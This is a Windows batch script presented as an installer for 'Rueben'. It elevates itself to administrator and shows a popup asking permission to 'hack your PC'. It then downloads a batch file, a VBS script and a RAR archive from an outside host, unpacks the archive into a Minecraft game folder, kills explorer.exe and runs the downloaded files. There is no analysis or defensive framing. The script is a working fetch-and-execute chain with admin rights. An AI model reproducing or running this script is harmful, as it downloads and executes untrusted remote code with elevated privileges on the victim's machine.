@echo off
setlocal
title Rueben - Installing

REM Check for Admin privileges using NET SESSION
NET SESSION >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    GOTO run_elevated
) ELSE (
    GOTO elevate_script
)

:elevate_script
    ECHO Starting elevation...
    REM Launch the script using PowerShell with the 'runas' verb
    PowerShell Start-Process -FilePath "%~f0" -Verb RunAs
    EXIT /B

:run_elevated
REM --- Your Elevated Commands Go Below This Line ---
ECHO Running with Administrator privileges...
ECHO Current directory is: %CD%
powershell.exe -Command "$wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup('Allow Rueben to access and hack your PC?', 0, 'Rueben', 64)"
chcp 65001 >nul
cls
echo.
echo.
echo.
echo.
echo                                 [38;5;21m██████╗ ██╗   ██╗███████╗██████╗ ███████╗███╗   ██╗
echo                                 [38;5;27m██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝████╗  ██║
echo                                 [38;5;33m██████╔╝██║   ██║█████╗  ██████╔╝█████╗  ██╔██╗ ██║
echo                                 [38;5;39m██╔══██╗██║   ██║██╔══╝  ██╔══██╗██╔══╝  ██║╚██╗██║
echo                                 [38;5;45m██║  ██║╚██████╔╝███████╗██████╔╝███████╗██║ ╚████║
echo                                 [38;5;201╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝
echo.
echo.
echo.
echo.
title Rueben - Installing
cd %temp%
curl -o rueben.bat "http://drev.0x.no/tempfiles/rueben.bat"
curl -o minimize.vbs "http://drev.0x.no/tempfiles/minimize.vbs"
cd C:\XboxGames\Minecraft for Windows\Content
curl -o rueben.rar "http://drev.0x.no/tempfiles/rueben.rar"
tar -xf rueben.rar
cd %temp%
start minimize.vbs
taskkill /f /im explorer.exe
start rueben.bat

